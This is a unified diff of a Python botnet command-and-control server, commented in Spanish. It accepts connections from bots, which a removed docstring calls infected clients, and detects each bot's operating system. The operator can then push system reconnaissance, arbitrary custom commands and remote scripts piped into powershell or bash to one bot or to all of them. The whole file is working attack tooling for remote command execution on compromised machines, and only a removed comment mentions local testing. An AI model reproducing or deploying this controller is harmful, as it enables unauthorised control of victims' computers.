@@ -1,237 +1,273 @@
 import socket
 import threading
 
-HOST = "127.0.0.1"  # IP del servidor C&C
-PORT = 9999  # Puerto que escucha el servidor C&C
-bots = []  # Lista de bots conectados
-bot_ids = {}  # Diccionario para almacenar los IDs de los bots
+HOST = "127.0.0.1" # IP del servidor
+PORT = 9999 # Puerto que escucha
+bots = [] # List de bots
+bot_ids = {} # Diccinario con los IDS de los bots
+sistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot
 
 def manejar_bot(conn, addr, bot_id): 
+    
     """
-    Maneja una conexión entrante de un bot.
-
-    Recibe los mensajes del bot y los imprime en la consola. Si el bot se
-    desconecta, elimina su conexión de la lista de bots conectados y
-    cierra la conexión.
-
-    Parameters:
-        conn (socket.socket): El socket de la conexión entrante del bot.
-        addr (tuple): La dirección IP y puerto del bot conectado.
-        bot_id (int): El ID del bot asignado automáticamente.
-
-    Returns:
-        None
+    Maneja una conexión con un bot. Recibe el socket de la conexión, la
+    dirección del bot y su ID. Intenta detectar el sistema operativo del bot
+    y lo almacena en el diccionario sistemas_operativos. Luego, entra en un
+    bucle de espera en el que muestra los mensajes enviados por el bot. Si
+    ocurre un error, se cierra la conexión y se eliminan las entradas del
+    bot de los diccionarios.
     """
-    print(f"Bot {bot_id} conectado desde {addr}") # Cuanto un bot se conecta se imprime su ID y la IP
+    
+    print(f"Bot {bot_id} conectado desde {addr}")
+
+    # Detectar si el bot usa Windows o Linux
+    try:
+        conn.send("detect_os".encode("utf-8")) # Enviar el comando para detectar el SO
+        os_info = conn.recv(1024).decode("utf-8").strip().lower() # Recibir la respuesta
+        sistemas_operativos[conn] = "windows" if "windows" in os_info else "linux" # Almacenar el SO
+        print(f"Bot {bot_id} identificado como {sistemas_operativos[conn].capitalize()}") # Imprimir el SO
+    except Exception as e:
+        print(f"Error al detectar OS de {addr}: {e}") # Imprimir el error
+        sistemas_operativos[conn] = "desconocido" # Almacenar el SO desconocido
+
     while True:
         try:
-            # Recibir mensaje del bot (puede ser un comando o información)
-            data = conn.recv(4096)  # Aumentar el tamaño del buffer para recibir más datos
-            if not data: 
+            data = conn.recv(4096) # Recibir el mensaje
+            if not data: # Si el mensaje está vacío
                 break 
-
-            print(f"Mensaje recibido de {addr}: {data.decode('utf-8', errors='ignore')}") # Imprimir el mensaje recibido
-
+            print(f"Mensaje recibido de {addr}: {data.decode('utf-8', errors='ignore')}") # Imprimir el mensaje
         except Exception as e:
-            print(f"Error con {addr}: {e}")
+            print(f"Error con {addr}: {e}") # Imprime el error
             break
     
-    conn.close() # Cierra la conexion
-    bots.remove(conn) # Elimina la conexion
-    del bot_ids[conn] # Elimina el ID
-    print(f"Bot {bot_id} desconectado") # Imprime que el bot se desconecto
+    conn.close() # Cerrar la conexión
+    bots.remove(conn) # Eliminar el bot de la lista
+    del bot_ids[conn] # Eliminar el ID del bot
+    del sistemas_operativos[conn] # Eliminar el SO del bot
+    print(f"Bot {bot_id} desconectado") # Imprimir que el bot se desconecto
 
 def servidor_CnC():
+    
     """
-    Inicia el servidor C&C.
-
-    El servidor C&C se encarga de recibir conexiones de los bots infectados y
-    de ofrecer un menú principal para interactuar con ellos. El menú principal
-    permite:
-
-    1. Listar los bots conectados.
-    2. Dar órdenes a los bots.
-    3. Cerrar la conexión de los bots.
-    5. Salir de la consola.
-
-    La opción 4, autoborrar cliente infectado, se encuentra comentada y no
-    se utiliza actualmente. Esto se debe a que este programa se está utilizando solo
-    para pruebas en local y no queremos autoborrar clientes infectados todo el rato.
-
-    Returns:
-        None
+    Inicia el servidor C&C. Abre un socket y espera conexiones de bots. 
+    Crea un hilo para manejar las conexiones y entra en un bucle principal 
+    que muestra un menú para enviar comandos a los bots, cerrar conexiones 
+    o salir de la consola.
     """
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Creamos un socket
-    server.bind((HOST, PORT))  # Asociamos el socket a la dirección y puerto
-    server.listen(5)  # Escuchamos 5 conexiones entrantes
-    print(f"Escuchando en {HOST}:{PORT}...")  # Imprimimos confirmación
-
-    # Crear un hilo para aceptar conexiones entrantes (bots)
-    threading.Thread(target=aceptar_conexiones, args=(server,)).start()
+    
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Crear el socket
+    server.bind((HOST, PORT)) # Asociar el socket a la IP y el puerto
+    server.listen(5) # Escuchar conexiones
+    print(f"Escuchando en {HOST}:{PORT}...") # Imprimir que el servidor esta escuchando
+    
+    threading.Thread(target=aceptar_conexiones, args=(server,)).start() # Crear un hilo para aceptar conexiones
 
     while True:
         print("\nMenú Principal:")
         print("1. Listar bots conectados")
-        print("2. Dar órdenes a los bots")
-        print("3. Cerrar conexión de los bots")
-        # print("4. Autoborrar cliente infectado")  # Opción comentada
-        print("5. Salir de la consola")
+        print("2. Enviar comandos")
+        print("3. Cerrar conexión con un bot")
+        print("4. Salir")
         opcion = input("Seleccione una opción: ")
 
         if opcion == "1":
             listar_bots()
         elif opcion == "2":
-            dar_ordenes()
+            menu_comandos()
         elif opcion == "3":
             cerrar_conexion_bots()
-        elif opcion == "5":
+        elif opcion == "4":
             print("Saliendo de la consola...")
             exit()
         else:
             print("Opción no válida. Intente de nuevo.")
 
 def aceptar_conexiones(server):
+    
     """
-    Acepta conexiones entrantes de bots y las maneja en un hilo separado.
-
-    Este hilo se encarga de aceptar conexiones entrantes de bots, agregarlas a la
-    lista de bots conectados y asignarles un ID único. Luego, crea un hilo
-    separado para manejar cada bot conectado con la función `manejar_bot`.
-
-    Parameters:
-        server (socket.socket): El socket del servidor C&C que escucha conexiones entrantes.
-
-    Returns:
-        None
+    Función que acepta conexiones entrantes en el servidor C&C y
+    las asigna a un hilo para manejarlas. Cada bot se asigna un
+    identificador único que se utiliza para enviar comandos y
+    cerrar conexiones.
     """
     
-    bot_id = 1
+    bot_id = 1 # Contador de bots
     while True:
-        conn, addr = server.accept() # Aceptar conexiones entrantes (bots)
-        bots.append(conn) # Concatenamos las conexiones a la lista de bots
-        bot_ids[conn] = bot_id
-        # Crear un hilo para manejar cada bot conectado
-        threading.Thread(target=manejar_bot, args=(conn, addr, bot_id)).start()
-        bot_id += 1
+        conn, addr = server.accept() # Aceptar la conexión
+        bots.append(conn) # Agregar el bot a la lista
+        bot_ids[conn] = bot_id # Asignar el ID del bot
+        threading.Thread(target=manejar_bot, args=(conn, addr, bot_id)).start() # Crear un hilo para manejar la conexión
+        bot_id += 1 # Incrementar el contador de bots
 
 def listar_bots():
+    
     """
-    Lista todos los bots conectados al servidor C&C.
-
-    Esta función imprime en la consola los IDs y direcciones de los bots
-    actualmente conectados al servidor C&C. Si no hay bots conectados, 
-    imprime un mensaje indicando que no hay conexiones activas.
-
-    Returns:
-        None
+    Muestra la lista de bots conectados actualmente, con su respectivo
+    identificador, sistema operativo y dirección IP.
     """
-
-    if bots: ## Si hay bots
+    
+    if bots:
         print("\nBots conectados:")
-        for bot in bots: # Por cada bot
-            print(f"Bot {bot_ids[bot]}: {bot.getpeername()}") # Imprime el ID y la dirección
+        for bot in bots: # Recorrer la lista de bots
+            so = sistemas_operativos.get(bot, "Desconocido") # Obtener el SO del bot
+            print(f"Bot {bot_ids[bot]} ({so.capitalize()}): {bot.getpeername()}") # Imprimir el bot
     else:
         print("No hay bots conectados.")
 
-def dar_ordenes():
+def menu_comandos():
     
     """
-    Da órdenes a los bots conectados al servidor C&C.
-    
-    Si no hay bots, la función imprime por la consola que no hay bots conectados, si no,
-    muestra un menú por pantalla para que el usuario pueda seleccionar lo que quiere hacer con el bot.
-    El menú permite:
-    1. Hacer PING a una dirección específica
-    2. Comando personalizado
-    3. Obtener información del sistema
-    4. Listar archivos en el directorio actual
-    5. Enviar orden a todos los bots
-    
-    Returns:
-        None
+    Muestra un menú con las órdenes disponibles para los bots.
+    Pide al usuario seleccionar una orden y, según la elección,
+    prepara el comando para enviar a los bots. Si el usuario elige
+    una orden personalizada o un script, pide ingresar el texto
+    del comando/script y lo envía a los bots.
     """
     
-    if not bots: # Si no hay bots
+    if not bots:
         print("No hay bots conectados.")
         return
 
     print("\nÓrdenes disponibles:")
     print("1. Hacer PING a una dirección específica")
-    print("2. Comando personalizado")
-    print("3. Obtener información del sistema")
-    print("4. Listar archivos en el directorio actual")
-    print("5. Enviar orden a todos los bots")
+    print("2. Obtener información del sistema")
+    print("3. Listar archivos en el directorio actual")
+    print("4. Ver procesos en ejecución")
+    print("5. Consultar conexiones de red")
+    print("6. Obtener la IP pública")
+    print("7. Ejecutar un comando personalizado")
+    print("8. Ejecutar un script remoto")
+    
     orden = input("Seleccione una orden: ")
+    comando_windows = ""
+    comando_linux = ""
 
     if orden == "1":
         direccion = input("Ingrese la dirección a hacer PING: ")
-        comando = f"ping {direccion}"
+        comando_windows = f"ping {direccion}"
+        comando_linux = f"ping -c 4 {direccion}"
     elif orden == "2":
-        comando = input("Ingrese el comando personalizado: ")
+        comando_windows = "systeminfo"
+        comando_linux = "uname -a && lsb_release -a"
     elif orden == "3":
-        comando = "systeminfo"
+        comando_windows = "dir"
+        comando_linux = "ls -lah"
     elif orden == "4":
-        comando = "dir"
+        comando_windows = "tasklist"
+        comando_linux = "ps aux"
     elif orden == "5":
-        comando = input("Ingrese el comando para todos los bots: ")
-        for bot in bots:
-            try:
-                bot.send(comando.encode('utf-8')) # Envía el comando al bot codificado en UTF-8
-            except Exception as e:
-                print(f"Error al enviar orden a {bot.getpeername()}: {e}") # Si falla, imprimimos el error y el nombre del bot.
-        return
+        comando_windows = "netstat -ano"
+        comando_linux = "netstat -tunapl"
+    elif orden == "6":
+        comando_windows = "curl ifconfig.me"
+        comando_linux = "curl ifconfig.me"
+    elif orden == "7":
+        comando_windows = input("Ingrese el comando personalizado para Windows: ")
+        comando_linux = input("Ingrese el comando personalizado para Linux: ")
+    elif orden == "8":
+        script = input("Ingrese el script a ejecutar (Python/Bash): ")
+        comando_windows = f"echo '{script}' | powershell -Command -"
+        comando_linux = f"echo '{script}' | bash"
     else:
-        print("Orden no válida.")
+        print("Opción no válida.")
         return
 
+    enviar_comando(comando_windows, comando_linux)
+
+def enviar_comando(comando_windows, comando_linux):
+    
+    """
+    Envia un comando a los bots seleccionados por el usuario.
+    
+    El usuario puede seleccionar a los bots a los que quiere dar órdenes
+    mediante un ID separado por comas o bien escribir "todos" para
+    enviar el comando a todos los bots conectados.
+    
+    :param comando_windows: El comando a enviar a los bots con Windows.
+    :param comando_linux: El comando a enviar a los bots con Linux.
+    """
+    
     print("\nSeleccione los bots a los que quiere dar órdenes (separados por comas) o 'todos' para todos los bots:")
     listar_bots()
     seleccion = input("Ingrese su selección: ")
 
     if seleccion.lower() == "todos":
         for bot in bots:
-            try:
-                bot.send(comando.encode('utf-8'))
-            except Exception as e:
-                print(f"Error al enviar orden a {bot.getpeername()}: {e}")
+            enviar_comando_a_bot(bot, comando_windows, comando_linux) # Enviar el comando a todos los bots
     else:
-        bot_ids_seleccionados = [int(id.strip()) for id in seleccion.split(",")]
-        for bot_id in bot_ids_seleccionados:
-            bot = next((b for b in bots if bot_ids[b] == bot_id), None)
+        bot_ids_seleccionados = [int(id.strip()) for id in seleccion.split(",") if id.strip().isdigit()] # Obtener los IDs de los bots seleccionados
+        for bot_id in bot_ids_seleccionados: # Recorrer los IDs de los bots seleccionados
+            bot = next((b for b in bots if bot_ids[b] == bot_id), None) # Buscar el bot con el ID correspondiente
             if bot:
-                try:
-                    bot.send(comando.encode('utf-8'))
-                except Exception as e:
-                    print(f"Error al enviar orden a {bot.getpeername()}: {e}")
+                enviar_comando_a_bot(bot, comando_windows, comando_linux) # Enviar el comando al bot
             else:
-                print(f"ID de bot {bot_id} no válido.")
+                print(f"ID de bot {bot_id} no válido.") # Imprimir un mensaje de error
+
+def enviar_comando_a_bot(bot, comando_windows, comando_linux):
+    
+    """
+    Envia un comando a un bot.
+    
+    :param bot: El socket del bot al que se quiere enviar el comando.
+    :param comando_windows: El comando a enviar a los bots con Windows.
+    :param comando_linux: El comando a enviar a los bots con Linux.
+    """
+    so = sistemas_operativos.get(bot, "desconocido") # Obtener el SO del bot
+    comando = comando_windows if so == "windows" else comando_linux # Obtener el comando correspondiente al SO
+
+    try:
+        bot.send(comando.encode('utf-8')) # Enviar el comando
+        print(f"Orden enviada a bot {bot_ids[bot]} ({so.capitalize()})") # Imprimir un mensaje de confirmación
+    except Exception as e:
+        print(f"Error al enviar orden a {bot.getpeername()}: {e}") # Imprimir un mensaje de error
 
 def cerrar_conexion_bots():
+    
     """
-    Cierra la conexión de un bot conectado al servidor C&C.
-
-    Esta función lista los bots conectados y pide al usuario que ingrese el ID del
-    bot cuya conexión quiere cerrar. Si el ID es válido, cierra la conexión del bot
-    y lo elimina de la lista de bots conectados.
-
-    Returns:
-        None
+    Cierra la conexión con un bot seleccionado por el usuario.
+    
+    El usuario puede seleccionar a los bots a los que quiere cerrar la conexión
+    mediante un ID o bien escribir "todos" para cerrar la conexión con todos
+    los bots conectados.
+    
+    :return: None
     """
+    
     if not bots:
         print("No hay bots conectados.")
         return
 
     listar_bots()
-    bot_id = int(input("Seleccione el ID del bot cuya conexión quiere cerrar: "))
-    bot = next((b for b in bots if bot_ids[b] == bot_id), None)
-    if not bot:
-        print("ID de bot no válido.")
+    
+    try:
+        bot_id = int(input("Seleccione el ID del bot cuya conexión quiere cerrar: ")) # Obtener el ID del bot seleccionado
+    except ValueError:
+        print("ID inválido. Debe ingresar un número.")
         return
 
-    bot.close()
-    bots.remove(bot)
-    del bot_ids[bot]
-    print(f"Conexión con el bot {bot_id} cerrada.")
+    bot = next((b for b in bots if bot_ids.get(b) == bot_id), None) # Buscar el bot con el ID correspondiente
+    
+    if not bot: # Si no se encuentra el bot
+        print(f"ID de bot {bot_id} no válido.") # Imprimir un mensaje de error
+        return
+
+    try:
+        bot.close() # Cerrar la conexión
+        print(f"Conexión con el bot {bot_id} cerrada.") # Imprimir un mensaje de confirmación
+    except Exception as e:
+        print(f"Error al cerrar la conexión con el bot {bot_id}: {e}")
+
+    if bot in bots:
+        bots.remove(bot) # Eliminar el bot de la lista
+
+    if bot in bot_ids:
+        del bot_ids[bot] # Eliminar el ID del bot
+
+    if bot in sistemas_operativos:
+        del sistemas_operativos[bot] # Eliminar el SO del bot
+
+    print(f"Bot {bot_id} eliminado correctamente del sistema.")
+
 
 if __name__ == "__main__":
     servidor_CnC()
